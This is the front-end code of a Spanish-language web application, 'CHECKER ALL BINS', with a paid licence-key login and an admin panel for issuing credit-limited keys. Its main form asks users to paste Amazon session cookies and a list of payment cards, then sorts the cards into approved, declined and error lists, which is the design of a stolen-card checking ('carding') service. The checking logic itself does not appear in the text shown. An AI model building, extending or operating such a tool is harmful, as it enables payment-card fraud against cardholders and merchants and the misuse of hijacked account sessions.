<!DOCTYPE html>
<html lang="es-ES">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Zhentio Chk</title>
  <link rel="icon" type="image/x-icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><circle cx='50' cy='50' r='40' fill='%2306b6d4'/></svg>" />
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" />
  <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.15.1/css/all.css" />
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/css/toastr.min.css" />
  <style>
    body {
      background: linear-gradient(135deg, #1e293b 0%, #0f766e 50%, #2dd4bf 100%);
      color: #fff;
      padding: 1rem;
      min-height: 100vh;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
    }
    .container.text-white.rounded.shadow.p-3.my-4 {
      background: rgba(8, 145, 178, 0.2);
      backdrop-filter: blur(15px);
      border-radius: 20px;
      border: 2px solid rgba(6, 182, 212, 0.3);
      box-shadow: 0 12px 40px rgba(6, 182, 212, 0.2);
    }
    button {
      padding: 14px 28px;
      background: linear-gradient(45deg, #0891b2, #06b6d4);
      color: white;
      border: none;
      cursor: pointer;
      border-radius: 25px;
      margin-right: 8px;
      margin-bottom: 5px;
      box-shadow: 0 6px 20px rgba(6, 182, 212, 0.4);
      transition: all 0.3s ease;
      font-weight: 600;
      text-transform: uppercase;
      letter-spacing: 0.5px;
      font-size: 16px;
    }
    button:hover {
      transform: translateY(-3px);
      box-shadow: 0 8px 25px rgba(6, 182, 212, 0.6);
      background: linear-gradient(45deg, #06b6d4, #0891b2);
    }
    button:disabled {
      background: linear-gradient(45deg, #475569, #64748b);
      cursor: not-allowed;
      transform: none;
      box-shadow: 0 2px 8px rgba(100, 116, 139, 0.3);
    }
    #chk-start {
      background: linear-gradient(45deg, #0ea5e9, #0284c7);
      box-shadow: 0 6px 20px rgba(14, 165, 233, 0.4);
    }
    #chk-start:hover {
      background: linear-gradient(45deg, #0284c7, #0ea5e9);
      box-shadow: 0 8px 25px rgba(14, 165, 233, 0.6);
    }
    #chk-pause {
      background: linear-gradient(45deg, #06b6d4, #0891b2);
      box-shadow: 0 6px 20px rgba(6, 182, 212, 0.4);
    }
    #chk-pause:hover {
      background: linear-gradient(45deg, #0891b2, #06b6d4);
      box-shadow: 0 8px 25px rgba(6, 182, 212, 0.6);
    }
    #chk-stop {
      background: linear-gradient(45deg, #0c4a6e, #075985);
      box-shadow: 0 6px 20px rgba(12, 74, 110, 0.4);
    }
    #chk-stop:hover {
      background: linear-gradient(45deg, #075985, #0c4a6e);
      box-shadow: 0 8px 25px rgba(12, 74, 110, 0.6);
    }
    #chk-clean {
      background: linear-gradient(45deg, #0369a1, #0284c7);
      box-shadow: 0 6px 20px rgba(3, 105, 161, 0.4);
    }
    #chk-clean:hover {
      background: linear-gradient(45deg, #0284c7, #0369a1);
      box-shadow: 0 8px 25px rgba(3, 105, 161, 0.6);
    }
    .nav-tabs {
      background: rgba(6, 182, 212, 0.2);
      backdrop-filter: blur(15px);
      border-radius: 20px;
      border: 2px solid rgba(14, 165, 233, 0.3);
      padding: 10px;
      margin-bottom: 0;
      box-shadow: 0 6px 25px rgba(6, 182, 212, 0.2);
    }
    .nav-tabs .nav-item a.nav-link {
      background: rgba(14, 165, 233, 0.2) !important;
      border: 2px solid rgba(6, 182, 212, 0.3);
      color: #67e8f9;
      margin-right: 10px;
      border-radius: 15px;
      width: 60px;
      height: 60px;
      display: flex;
      align-items: center;
      justify-content: center;
      transition: all 0.3s ease;
      padding: 0;
      font-size: 24px;
      backdrop-filter: blur(10px);
    }
    .nav-tabs .nav-item a.nav-link:hover {
      border-color: rgba(6, 182, 212, 0.6);
      color: #a5f3fc;
      background: rgba(6, 182, 212, 0.3) !important;
      transform: translateY(-3px);
      box-shadow: 0 6px 20px rgba(6, 182, 212, 0.3);
    }
    .nav-tabs .nav-item a.nav-link.active {
      border: 2px solid #06b6d4;
      color: white !important;
      background: linear-gradient(45deg, #0891b2, #06b6d4) !important;
      box-shadow: 0 6px 20px rgba(6, 182, 212, 0.5);
    }
    .tab-content {
      background: rgba(6, 182, 212, 0.15);
      backdrop-filter: blur(15px);
      color: #fff;
      padding: 25px 30px;
      border-radius: 20px;
      border: 2px solid rgba(14, 165, 233, 0.3);
      min-height: 280px;
      box-shadow: 0 10px 35px rgba(6, 182, 212, 0.2);
    }
    textarea {
      background: rgba(6, 182, 212, 0.15);
      backdrop-filter: blur(15px);
      color: #a5f3fc;
      width: 100%;
      border-radius: 15px;
      border: 2px solid rgba(14, 165, 233, 0.3);
      padding: 20px;
      resize: none;
      font-size: 16px;
      transition: all 0.3s ease;
    }
    textarea:focus {
      outline: none;
      box-shadow: 0 0 25px rgba(6, 182, 212, 0.5);
      border: 2px solid #06b6d4;
      background: rgba(6, 182, 212, 0.25);
      color: #ffffff;
    }
    textarea::placeholder {
      color: rgba(165, 243, 252, 0.7);
    }
    .badge-warning {
      background: linear-gradient(45deg, #0891b2, #06b6d4);
      color: white;
      font-weight: 600;
      padding: 10px 20px;
      border-radius: 25px;
      font-size: 14px;
      box-shadow: 0 6px 20px rgba(6, 182, 212, 0.4);
    }
    #lives, #dies, #errors {
      max-height: 300px;
      overflow-y: auto;
      padding: 20px;
      border: 2px solid rgba(14, 165, 233, 0.3);
      border-radius: 15px;
      background: rgba(12, 74, 110, 0.4);
      backdrop-filter: blur(15px);
      color: #a5f3fc;
      margin-top: 12px;
      white-space: pre-wrap;
      word-break: break-word;
      font-family: 'Courier New', monospace;
      font-size: 15px;
      box-shadow: inset 0 3px 15px rgba(6, 182, 212, 0.2);
    }
    #lives {
      border-left: 4px solid #06b6d4;
    }
    #dies {
      border-left: 4px solid #0369a1;
    }
    #errors {
      border-left: 4px solid #0891b2;
    }
    .val-lives, .val-dies, .val-errors, .val-tested, .val-total {
      color: #67e8f9;
      font-weight: bold;
      text-shadow: 0 2px 5px rgba(6, 182, 212, 0.5);
    }
    .val-dies {
      color: #0ea5e9 !important;
    }
    .val-errors {
      color: #0891b2 !important;
    }
    .val-tested {
      color: #06b6d4 !important;
    }
    .val-total {
      color: #a5f3fc !important;
    }
    h3 {
      text-shadow: 0 3px 15px rgba(6, 182, 212, 0.5);
      font-weight: bold;
      color: #a5f3fc;
    }
    h5 {
      color: #67e8f9;
      text-shadow: 0 2px 8px rgba(6, 182, 212, 0.4);
      margin-bottom: 18px;
      font-size: 20px;
    }
    label {
      color: #a5f3fc;
      font-weight: 600;
      margin-bottom: 10px;
      text-shadow: 0 2px 5px rgba(6, 182, 212, 0.4);
      font-size: 17px;
    }
    #copyButton {
      background: linear-gradient(45deg, #0ea5e9, #0284c7);
      padding: 12px 18px;
      border-radius: 12px;
      margin-right: 8px;
      font-size: 15px;
    }
    #copyButton:hover {
      background: linear-gradient(45deg, #0284c7, #0ea5e9);
    }
    .container .my-2 {
      background: rgba(6, 182, 212, 0.1);
      padding: 18px;
      border-radius: 15px;
      margin: 18px 0;
      border: 2px solid rgba(14, 165, 233, 0.2);
      backdrop-filter: blur(10px);
    }
    .container .my-2 span {
      font-size: 18px;
    }
    /* Scrollbar personalizado con tema azul */
    #lives::-webkit-scrollbar, #dies::-webkit-scrollbar, #errors::-webkit-scrollbar {
      width: 8px;
    }
    #lives::-webkit-scrollbar-track, #dies::-webkit-scrollbar-track, #errors::-webkit-scrollbar-track {
      background: rgba(6, 182, 212, 0.2);
      border-radius: 4px;
    }
    #lives::-webkit-scrollbar-thumb {
      background: #06b6d4;
      border-radius: 4px;
    }
    #dies::-webkit-scrollbar-thumb {
      background: #0ea5e9;
      border-radius: 4px;
    }
    #errors::-webkit-scrollbar-thumb {
      background: #0891b2;
      border-radius: 4px;
    }
    /* Animación de pulso mejorada con colores azules */
    @keyframes pulse {
      0% { 
        transform: scale(1); 
        box-shadow: 0 6px 20px rgba(6, 182, 212, 0.4);
      }
      50% { 
        transform: scale(1.05); 
        box-shadow: 0 8px 25px rgba(6, 182, 212, 0.6);
      }
      100% { 
        transform: scale(1); 
        box-shadow: 0 6px 20px rgba(6, 182, 212, 0.4);
      }
    }
    .badge-warning {
      animation: pulse 2s infinite;
    }
    /* Header styles */
    .header-container {
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 15px;
      margin-bottom: 10px;
    }
    .header-logo {
      width: 70px;
      height: 70px;
      border-radius: 50%;
      border: 3px solid rgba(6, 182, 212, 0.4);
      box-shadow: 0 8px 25px rgba(6, 182, 212, 0.3);
      transition: all 0.3s ease;
      object-fit: cover;
    }
    .header-logo:hover {
      transform: scale(1.1);
      box-shadow: 0 12px 35px rgba(6, 182, 212, 0.5);
      border-color: rgba(6, 182, 212, 0.6);
    }
    /* Animación flotante para el logo */
    @keyframes logoFloat {
      0%, 100% { transform: translateY(0px); }
      50% { transform: translateY(-3px); }
    }
    .header-logo {
      animation: logoFloat 3s ease-in-out infinite;
    }
    .header-title {
      display: flex;
      flex-direction: column;
      align-items: flex-start;
    }
    .main-title {
      font-size: 32px;
      font-weight: bold;
      color: #a5f3fc;
      text-shadow: 0 3px 15px rgba(6, 182, 212, 0.5);
      margin: 0;
      line-height: 1;
    }

    /* Estilos para la pantalla de login */
    #loginScreen {
      min-height: 100vh;
      display: none;
      align-items: center;
      justify-content: center;
    }

    #loginScreen.show {
      display: flex !important;
    }

    .login-container {
      background: rgba(8, 145, 178, 0.2);
      backdrop-filter: blur(15px);
      border-radius: 20px;
      border: 2px solid rgba(6, 182, 212, 0.3);
      box-shadow: 0 12px 40px rgba(6, 182, 212, 0.2);
      padding: 40px;
      max-width: 450px;
      width: 100%;
      text-align: center;
    }

    .login-title {
      font-size: 28px;
      font-weight: bold;
      color: #a5f3fc;
      text-shadow: 0 3px 15px rgba(6, 182, 212, 0.5);
      margin-bottom: 30px;
    }

    .login-subtitle {
      color: #67e8f9;
      margin-bottom: 25px;
      font-size: 16px;
    }

    #keyInput {
      background: rgba(6, 182, 212, 0.15);
      backdrop-filter: blur(15px);
      color: #a5f3fc;
      width: 100%;
      border-radius: 15px;
      border: 2px solid rgba(14, 165, 233, 0.3);
      padding: 15px 20px;
      font-size: 16px;
      margin-bottom: 20px;
      text-align: center;
      text-transform: uppercase;
      letter-spacing: 1px;
      transition: all 0.3s ease;
    }

    #keyInput:focus {
      outline: none;
      box-shadow: 0 0 25px rgba(6, 182, 212, 0.5);
      border: 2px solid #06b6d4;
      background: rgba(6, 182, 212, 0.25);
      color: #ffffff;
    }

    #keyInput::placeholder {
      color: rgba(165, 243, 252, 0.7);
      text-transform: none;
      letter-spacing: normal;
    }

    #loginBtn {
      width: 100%;
      padding: 15px;
      font-size: 18px;
      font-weight: 600;
      text-transform: uppercase;
      letter-spacing: 1px;
      margin-bottom: 20px;
    }

    /* Información de sesión */
    #sessionInfo {
      background: rgba(6, 182, 212, 0.15);
      backdrop-filter: blur(15px);
      border-radius: 15px;
      padding: 12px 20px;
      border: 2px solid rgba(14, 165, 233, 0.3);
      color: #67e8f9;
      font-size: 14px;
      margin-bottom: 15px;
      display: flex;
      justify-content: space-between;
      align-items: center;
    }

    #logoutBtn {
      background: linear-gradient(45deg, #0c4a6e, #075985);
      padding: 8px 16px;
      font-size: 12px;
      border-radius: 20px;
      margin-left: 10px;
    }

    #logoutBtn:hover {
      background: linear-gradient(45deg, #075985, #0c4a6e);
    }

    #mainApp {
      display: none;
    }

    /* Estilos para el Panel de Administración */
    #adminPanel {
      display: none;
      padding: 20px 0;
    }

    .admin-container {
      background: rgba(8, 145, 178, 0.15);
      backdrop-filter: blur(20px);
      border-radius: 25px;
      border: 2px solid rgba(6, 182, 212, 0.4);
      box-shadow: 0 15px 50px rgba(6, 182, 212, 0.3);
      padding: 35px;
      margin-bottom: 25px;
      transition: all 0.3s ease;
    }

    .admin-container:hover {
      box-shadow: 0 20px 60px rgba(6, 182, 212, 0.4);
      transform: translateY(-2px);
    }

    .admin-header {
      text-align: center;
      margin-bottom: 35px;
      position: relative;
    }

    .admin-header::after {
      content: '';
      position: absolute;
      bottom: -15px;
      left: 50%;
      transform: translateX(-50%);
      width: 100px;
      height: 3px;
      background: linear-gradient(45deg, #06b6d4, #0ea5e9);
      border-radius: 2px;
    }

    .admin-title {
      font-size: 32px;
      font-weight: bold;
      color: #a5f3fc;
      text-shadow: 0 4px 20px rgba(6, 182, 212, 0.6);
      margin-bottom: 12px;
      letter-spacing: 1px;
    }

    .admin-subtitle {
      color: #67e8f9;
      font-size: 18px;
      font-weight: 500;
    }

    .key-management {
      background: linear-gradient(135deg, rgba(6, 182, 212, 0.08), rgba(14, 165, 233, 0.12));
      border-radius: 20px;
      padding: 30px;
      margin-bottom: 25px;
      border: 2px solid rgba(14, 165, 233, 0.3);
      backdrop-filter: blur(15px);
      position: relative;
      overflow: hidden;
    }

    .key-management::before {
      content: '';
      position: absolute;
      top: 0;
      left: 0;
      right: 0;
      height: 4px;
      background: linear-gradient(90deg, #06b6d4, #0ea5e9, #0284c7);
    }

    .key-management h4 {
      color: #a5f3fc;
      margin-bottom: 25px;
      font-size: 20px;
      font-weight: bold;
      display: flex;
      align-items: center;
      gap: 10px;
    }

    .form-group {
      margin-bottom: 20px;
    }

    .form-group label {
      display: block;
      color: #a5f3fc;
      font-weight: 600;
      margin-bottom: 8px;
      font-size: 14px;
      text-transform: uppercase;
      letter-spacing: 0.5px;
    }

    .form-group input, .form-group select {
      background: rgba(6, 182, 212, 0.12);
      backdrop-filter: blur(10px);
      color: #ffffff;
      width: 100%;
      border-radius: 12px;
      border: 2px solid rgba(14, 165, 233, 0.3);
      padding: 14px 18px;
      font-size: 15px;
      transition: all 0.3s ease;
      box-shadow: inset 0 2px 10px rgba(6, 182, 212, 0.1);
    }

    .form-group input:focus, .form-group select:focus {
      outline: none;
      box-shadow: 0 0 25px rgba(6, 182, 212, 0.4), inset 0 2px 10px rgba(6, 182, 212, 0.2);
      border: 2px solid #06b6d4;
      background: rgba(6, 182, 212, 0.2);
      transform: translateY(-1px);
    }

    .form-group input::placeholder {
      color: rgba(165, 243, 252, 0.6);
    }

    .form-row {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
      gap: 20px;
      margin-bottom: 20px;
    }

    .btn-admin {
      padding: 12px 24px;
      font-size: 14px;
      font-weight: 600;
      text-transform: uppercase;
      letter-spacing: 0.8px;
      margin-right: 12px;
      margin-bottom: 12px;
      border-radius: 25px;
      border: none;
      cursor: pointer;
      transition: all 0.3s ease;
      box-shadow: 0 6px 20px rgba(0, 0, 0, 0.2);
      position: relative;
      overflow: hidden;
    }

    .btn-admin::before {
      content: '';
      position: absolute;
      top: 0;
      left: -100%;
      width: 100%;
      height: 100%;
      background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
      transition: left 0.5s;
    }

    .btn-admin:hover::before {
      left: 100%;
    }

    .btn-admin:hover {
      transform: translateY(-3px);
      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
    }

    .btn-primary {
      background: linear-gradient(45deg, #0ea5e9, #0284c7);
      color: white;
    }

    .btn-success {
      background: linear-gradient(45deg, #10b981, #059669);
      color: white;
    }

    .btn-danger {
      background: linear-gradient(45deg, #ef4444, #dc2626);
      color: white;
    }

    .btn-warning {
      background: linear-gradient(45deg, #f59e0b, #d97706);
      color: white;
    }

    .keys-table {
      background: linear-gradient(135deg, rgba(12, 74, 110, 0.3), rgba(8, 145, 178, 0.2));
      backdrop-filter: blur(20px);
      border-radius: 20px;
      padding: 25px;
      margin-top: 25px;
      border: 2px solid rgba(14, 165, 233, 0.4);
      max-height: 500px;
      overflow-y: auto;
      box-shadow: 0 10px 40px rgba(6, 182, 212, 0.2);
    }

    .keys-table h4 {
      color: #a5f3fc;
      margin-bottom: 20px;
      font-size: 20px;
      font-weight: bold;
      display: flex;
      align-items: center;
      gap: 10px;
    }

    .keys-table table {
      width: 100%;
      color: #a5f3fc;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      font-size: 13px;
      border-collapse: collapse;
    }

    .keys-table th {
      background: linear-gradient(45deg, rgba(6, 182, 212, 0.4), rgba(14, 165, 233, 0.3));
      color: #ffffff;
      padding: 15px 10px;
      text-align: left;
      font-weight: bold;
      border-bottom: 2px solid rgba(6, 182, 212, 0.6);
      text-transform: uppercase;
      letter-spacing: 0.5px;
      font-size: 12px;
      position: sticky;
      top: 0;
      z-index: 10;
    }

    .keys-table td {
      padding: 12px 10px;
      border-bottom: 1px solid rgba(6, 182, 212, 0.2);
      vertical-align: middle;
    }

    .keys-table tr:hover {
      background: rgba(6, 182, 212, 0.15);
      transform: scale(1.01);
      transition: all 0.2s ease;
    }

    .key-status {
      padding: 6px 12px;
      border-radius: 20px;
      font-size: 11px;
      font-weight: bold;
      text-transform: uppercase;
      letter-spacing: 0.5px;
      display: inline-block;
      min-width: 70px;
      text-align: center;
    }

    .status-active {
      background: linear-gradient(45deg, rgba(16, 185, 129, 0.3), rgba(5, 150, 105, 0.4));
      color: #10b981;
      border: 2px solid #10b981;
      box-shadow: 0 4px 15px rgba(16, 185, 129, 0.3);
    }

    .status-inactive {
      background: linear-gradient(45deg, rgba(239, 68, 68, 0.3), rgba(220, 38, 38, 0.4));
      color: #ef4444;
      border: 2px solid #ef4444;
      box-shadow: 0 4px 15px rgba(239, 68, 68, 0.3);
    }

    .status-expired {
      background: linear-gradient(45deg, rgba(245, 158, 11, 0.3), rgba(217, 119, 6, 0.4));
      color: #f59e0b;
      border: 2px solid #f59e0b;
      box-shadow: 0 4px 15px rgba(245, 158, 11, 0.3);
    }

    .btn-small {
      padding: 6px 12px;
      font-size: 11px;
      margin: 2px;
      border-radius: 15px;
    }

    .admin-stats {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
      gap: 20px;
      margin-bottom: 25px;
    }

    .stat-card {
      background: linear-gradient(135deg, rgba(6, 182, 212, 0.12), rgba(14, 165, 233, 0.08));
      border-radius: 20px;
      padding: 25px;
      text-align: center;
      border: 2px solid rgba(14, 165, 233, 0.3);
      backdrop-filter: blur(15px);
      transition: all 0.3s ease;
      position: relative;
      overflow: hidden;
    }

    .stat-card::before {
      content: '';
      position: absolute;
      top: 0;
      left: 0;
      right: 0;
      height: 4px;
      background: linear-gradient(90deg, #06b6d4, #0ea5e9);
    }

    .stat-card:hover {
      transform: translateY(-5px);
      box-shadow: 0 15px 40px rgba(6, 182, 212, 0.3);
      border-color: rgba(6, 182, 212, 0.5);
    }

    .stat-number {
      font-size: 42px;
      font-weight: bold;
      color: #06b6d4;
      text-shadow: 0 4px 15px rgba(6, 182, 212, 0.6);
      margin-bottom: 8px;
      line-height: 1;
    }

    .stat-label {
      color: #67e8f9;
      font-size: 14px;
      font-weight: 600;
      text-transform: uppercase;
      letter-spacing: 0.5px;
    }

    /* Animaciones mejoradas */
    @keyframes slideInUp {
      from {
        opacity: 0;
        transform: translateY(30px);
      }
      to {
        opacity: 1;
        transform: translateY(0);
      }
    }

    @keyframes fadeInUp {
      from {
        opacity: 0;
        transform: translateY(20px);
      }
      to {
        opacity: 1;
        transform: translateY(0);
      }
    }

    @keyframes slideInLeft {
      from {
        opacity: 0;
        transform: translateX(-20px);
      }
      to {
        opacity: 1;
        transform: translateX(0);
      }
    }

    @keyframes pulse {
      0%, 100% {
        transform: scale(1);
      }
      50% {
        transform: scale(1.05);
      }
    }

    .stat-card:hover .stat-number {
      animation: pulse 0.6s ease-in-out;
    }

    #adminPanel.show {
      animation: slideInUp 0.5s ease-out;
    }

    /* Scrollbar personalizado para la tabla */
    .keys-table::-webkit-scrollbar {
      width: 8px;
    }

    .keys-table::-webkit-scrollbar-track {
      background: rgba(6, 182, 212, 0.1);
      border-radius: 4px;
    }

    .keys-table::-webkit-scrollbar-thumb {
      background: linear-gradient(45deg, #06b6d4, #0ea5e9);
      border-radius: 4px;
    }

    .keys-table::-webkit-scrollbar-thumb:hover {
      background: linear-gradient(45deg, #0ea5e9, #0284c7);
    }

    /* Responsive para móviles */
    @media (max-width: 768px) {
      .admin-container {
        padding: 20px;
        margin: 10px;
      }
      
      .admin-title {
        font-size: 24px;
      }
      
      .form-row {
        grid-template-columns: 1fr;
      }
      
      .admin-stats {
        grid-template-columns: repeat(2, 1fr);
      }
      
      .keys-table {
        padding: 15px;
        font-size: 11px;
      }
      
      .keys-table th, .keys-table td {
        padding: 8px 5px;
      }
    }
  </style>
</head>
<body>
  <div id="loginScreen">
    <div class="login-container">
      <div class="header-container">
        <img src="logo.png" alt="Logo" class="header-logo">
        <div class="header-title">
          <h3 class="login-title">CHECKER ALL BINS</h3>
        </div>
      </div>
      
      <p class="login-subtitle">Ingresa tu key de acceso para continuar</p>
      
      <input type="text" id="keyInput" placeholder="Ingresa tu KEY aquí..." maxlength="40">
      <button id="loginBtn"><i class="fas fa-key"></i> Acceder</button>
      
      <div style="margin-top: 25px; padding: 10px; background: rgba(6, 182, 212, 0.1); border-radius: 8px; font-size: 12px; color: #67e8f9; text-align: center;">
        <i class="fas fa-shield-alt"></i> Sistema protegido con validación de servidor y detección anti-manipulación
      </div>
    </div>
  </div>

  <div id="mainApp">
    <div id="sessionInfo">
      <span>Cargando información de sesión...</span>
      <button id="logoutBtn"><i class="fas fa-sign-out-alt"></i> Cerrar Sesión</button>
    </div>

  <div class="container text-white rounded shadow p-3 my-4">
    <div class="container-fluid">
      <div class="header-container">
        <img src="logo.png" alt="Logo" class="header-logo">
        <div class="header-title">
          <h3 class="main-title">CHECKER ALL BINS</h3>
        </div>
      </div>
    </div>
    <div class="container-fluid mt-3">
      <div class="buttons">
        <button id="chk-start"><i class="fas fa-play"></i> Iniciar</button>
        <button id="chk-pause" disabled><i class="fas fa-pause"></i> Pausar</button>
        <button id="chk-stop" disabled><i class="fas fa-stop"></i> Parar</button>
        <button id="chk-clean"><i class="fas fa-trash-alt"></i> Limpiar</button>
      </div>
    </div>
    <div class="container-fluid mt-3">
      <span class="badge badge-warning" id="estatus">Esperando inicio...</span>
    </div>
  </div>

  <div class="container p-0 shadow">
    <ul class="nav nav-tabs" id="myTab" role="tablist" style="border: none;">
      <li class="nav-item">
        <a class="nav-link active" id="home-tab" data-toggle="tab" href="#chk-home" role="tab" aria-controls="home" aria-selected="true" title="Tarjetas">
          <i class="far fa-credit-card"></i>
        </a>
      </li>
      <li class="nav-item">
        <a class="nav-link" id="profile-tab" data-toggle="tab" href="#chk-lives" role="tab" aria-controls="profile" aria-selected="false" title="Aprobadas">
          <i class="fa fa-thumbs-up fa-lg"></i>
        </a>
      </li>
      <li class="nav-item">
        <a class="nav-link" id="contact-tab" data-toggle="tab" href="#chk-dies" role="tab" aria-controls="contact" aria-selected="false" title="Reprobadas">
          <i class="fa fa-thumbs-down fa-lg"></i>
        </a>
      </li>
      <li class="nav-item">
        <a class="nav-link" id="errors-tab" data-toggle="tab" href="#chk-errors" role="tab" aria-controls="errors" aria-selected="false" title="Errores">
          <i class="fas fa-times fa-lg"></i>
        </a>
      </li>
    </ul>

    <div class="tab-content" id="myTabContent">
      <div class="tab-pane fade show active px-3 pt-4 pb-3" id="chk-home" role="tabpanel" aria-labelledby="home-tab">
        <div class="my-2">
          Aprobadas: <span class="val-lives" style="font-weight: bold;">0</span>
          Reprobadas: <span class="val-dies" style="font-weight: bold;">0</span>
          Errores: <span class="val-errors" style="font-weight: bold;">0</span>
          Testeadas: <span class="val-tested" style="font-weight: bold;">0</span>
          Total: <span class="val-total" style="font-weight: bold;">0</span>
        </div>

        <div class="container-fluid p-0 mt-2">
          <label for="cookie_input"><i class="fas fa-cookie-bite"></i> Cookies</label>
          <textarea id="cookie_input" placeholder="Pega aquí tus cookies de Amazon..." rows="2"></textarea>
        </div>

        <div class="container-fluid p-0 mt-2">
          <label for="lista_cartoes"><i class="far fa-credit-card"></i> Lista de tarjetas:</label>
          <textarea id="lista_cartoes" placeholder="Ingrese su lista..." rows="8"></textarea>
        </div>
      </div>

      <div class="tab-pane fade px-3 pt-4 pb-3" id="chk-lives" role="tabpanel" aria-labelledby="profile-tab">
        <h5>Aprobadas</h5>
        <span>Total: <span class="val-lives">0</span></span>
        <br />
        <button id="copyButton"><i class="fas fa-copy"></i> Copiar</button>
        <button onclick="document.getElementById('lives').innerHTML = ''; updateCountsDisplay();"><i class="fas fa-trash-alt"></i> Limpiar</button>
        <pre id="lives"></pre>
      </div>

      <div class="tab-pane fade px-3 pt-4 pb-3" id="chk-dies" role="tabpanel" aria-labelledby="contact-tab">
        <h5>Reprobadas</h5>
        <span>Total: <span class="val-dies">0</span></span>
        <br />
        <button onclick="document.getElementById('dies').innerHTML = ''; updateCountsDisplay();"><i class="fas fa-trash-alt"></i> Limpiar</button>
        <pre id="dies"></pre>
      </div>

      <div class="tab-pane fade px-3 pt-4 pb-3" id="chk-errors" role="tabpanel" aria-labelledby="errors-tab">
        <h5>Errores</h5>
        <span>Total: <span class="val-errors">0</span></span>
        <br />
        <button onclick="document.getElementById('errors').innerHTML = ''; updateCountsDisplay();"><i class="fas fa-trash-alt"></i> Limpiar</button>
        <pre id="errors"></pre>
      </div>
    </div>
  </div>
  </div> <div id="adminPanel">
    <div id="adminSessionInfo" style="background: rgba(220, 38, 38, 0.15); border-color: rgba(220, 38, 38, 0.3);">
      <span>Panel de Administración Activo</span>
      <button id="adminLogoutBtn" style="background: linear-gradient(45deg, #dc2626, #b91c1c);"><i class="fas fa-sign-out-alt"></i> Salir</button>
    </div>

    <div class="admin-container">
      <div class="admin-header">
        <div class="header-container">
          <img src="logo.png" alt="Logo" class="header-logo">
          <div class="header-title">
            <h3 class="admin-title">PANEL DE ADMINISTRACIÓN</h3>
            <p class="admin-subtitle">Gestión de Keys y Sistema</p>
          </div>
        </div>
      </div>

      <div class="admin-stats">
        <div class="stat-card">
          <div class="stat-number" id="totalKeysCount">0</div>
          <div class="stat-label">Total Keys</div>
        </div>
        <div class="stat-card">
          <div class="stat-number" id="activeKeysCount">0</div>
          <div class="stat-label">Keys Activas</div>
        </div>
        <div class="stat-card">
          <div class="stat-number" id="usedKeysCount">0</div>
          <div class="stat-label">Keys Agotadas</div>
        </div>
        <div class="stat-card">
          <div class="stat-number" id="expiredKeysCount">0</div>
          <div class="stat-label">Keys Expiradas</div>
        </div>
      </div>

      <div class="key-management">
        <h4 style="color: #a5f3fc; margin-bottom: 20px;"><i class="fas fa-key"></i> Agregar Nueva Key</h4>
        
        <div class="form-row">
          <div class="form-group">
            <label for="newKeyCode">Código de Key</label>
            <input type="text" id="newKeyCode" placeholder="Ej: ZHENTIO-G3V9-PQ1X-R2Y5-Z7W8-C6D0-A1B2" maxlength="40">
          </div>
          <div class="form-group">
            <label for="creditsAssigned">Créditos Asignados</label>
            <input type="number" id="creditsAssigned" min="1" max="99999" value="100" placeholder="Ej: 1000">
          </div>
        </div>

        <div class="form-row">
          <div class="form-group">
            <label for="keyMaxUses">Máximo de Activaciones (Usos)</label>
            <input type="number" id="keyMaxUses" min="1" max="100000" value="99999" placeholder="1"> </div>
          <div class="form-group">
            <label for="customDescription">Descripción (Para Admin)</label>
            <input type="text" id="customDescription" placeholder="Ej: Key de prueba 100 créditos">
          </div>
        </div>

        <div class="form-row">
          <div class="form-group">
            <label for="keyExpiryDate">Fecha de Expiración (Opcional)</label>
            <input type="date" id="keyExpiryDate">
          </div>
          </div>

        <button class="btn-admin btn-success" onclick="addNewKey()">
          <i class="fas fa-plus"></i> Agregar Key
        </button>
        <button class="btn-admin btn-primary" onclick="generateRandomKey()">
          <i class="fas fa-random"></i> Generar Aleatoria
        </button>
        <button class="btn-admin btn-warning" onclick="exportKeys()">
          <i class="fas fa-download"></i> Exportar Keys
        </button>
        <button class="btn-admin btn-danger" onclick="clearAllKeys()">
          <i class="fas fa-trash"></i> Limpiar Todo
        </button>
      </div>

      <div class="keys-table">
        <h4 style="color: #a5f3fc; margin-bottom: 15px;"><i class="fas fa-list"></i> Keys del Sistema</h4>
        <table id="keysTable">
          <thead>
            <tr>
              <th>Código</th>
              <th>Tipo</th>
              <th>Créditos</th>
              <th>Activaciones</th>
              <th>Estado</th>
              <th>Creada</th>
              <th>Expira</th>
              <th>Acciones</th>
            </tr>
          </thead>
          <tbody id="keysTableBody">
            </tbody>
        </table>
      </div>
    </div>
  </div>

  <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js"></script>
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/js/toastr.min.js"></script>

  <script>
    // Sistema de autenticación mejorado y ofuscado
    const API_ENDPOINT = 'https://jsonplaceholder.typicode.com/posts'; // Simulación de API externa
    
    // Algoritmo de hash simple para generar tokens únicos
    function simpleHash(str) {
      let hash = 0;
      for (let i = 0; i < str.length; i++) {
        const char = str.charCodeAt(i);
        hash = ((hash << 5) - hash) + char;
        hash = hash & hash; // Convertir a 32 bits
      }
      return Math.abs(hash).toString(16);
    }

    // Función para obtener timestamp real del servidor (anti-manipulación de hora local)
    async function getServerTimestamp() {
      try {
        const response = await fetch('https://worldtimeapi.org/api/timezone/America/Guayaquil', { // Changed to Ecuador timezone
          method: 'GET',
          cache: 'no-cache'
        });
        const data = await response.json();
        return new Date(data.datetime).getTime();
      } catch (error) {
        // Fallback: usar hora local si falla la API
        console.warn('No se pudo obtener la hora del servidor, usando hora local');
        return new Date().getTime();
      }
    }

    // Base de datos de keys ofuscada (se valida con algoritmo)
